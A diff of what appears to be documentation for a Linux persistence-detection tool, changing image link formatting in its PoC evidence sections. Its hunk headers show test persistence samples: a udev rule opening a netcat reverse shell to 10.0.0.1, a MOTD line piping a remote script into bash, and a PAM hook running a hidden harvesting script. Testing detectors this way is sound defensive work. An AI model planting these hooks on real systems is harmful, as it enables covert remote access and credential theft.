@@ -44,7 +44,7 @@ ACTION=="add", KERNEL=="rtc0", ENV{CMD}="nc -e /bin/bash 10.0.0.1 4444", RUN+="/
 
 **PoC Evidence:**
 
-[![Udev Detection](assets/test-udev.png)](assets/test-udev.png)
+![Udev Detection](assets/test-udev.png)
 
 ---
 
@@ -64,7 +64,7 @@ ACTION=="add", SUBSYSTEM=="net", KERNEL=="eth0", RUN+="/bin/sh -c 'echo \"python
 
 **PoC Evidence:**
 
-[![Udev Python Detection](assets/test-udev2.png)](assets/test-udev2.png)
+![Udev Python Detection](assets/test-udev2.png)
 
 ---
 
@@ -97,7 +97,7 @@ WantedBy=multi-user.target
 
 **PoC Evidence:**
 
-[![Systemd Detection](assets/test-systemd.png)](assets/test-systemd.png)
+![Systemd Detection](assets/test-systemd.png)
 
 ---
 
@@ -119,7 +119,7 @@ WantedBy=multi-user.target
 
 **PoC Evidence:**
 
-[![Cron Detection](assets/test-cron.png)](assets/test-cron.png)
+![Cron Detection](assets/test-cron.png)
 
 ---
 
@@ -144,7 +144,7 @@ session    optional     pam_exec.so /dev/shm/.harvest.sh
 
 **PoC Evidence:**
 
-[![PAM Detection](assets/test-pam.png)](assets/test-pam.png)
+![PAM Detection](assets/test-pam.png)
 
 ---
 
@@ -168,7 +168,7 @@ curl -s -k https://10.0.0.1/update.sh | bash
 
 **PoC Evidence:**
 
-[![MOTD Detection](assets/test-motd.png)](assets/test-motd.png)
+![MOTD Detection](assets/test-motd.png)
 
 ---
 
@@ -188,7 +188,7 @@ dbus-send --system --dest=org.freedesktop.systemd1 /org/freedesktop/systemd1 org
 
 **PoC Evidence:**
 
-[![D-Bus Systemd Detection](assets/test-dbus.png)](assets/test-dbus.png)
+![D-Bus Systemd Detection](assets/test-dbus.png)
 
 ---
 
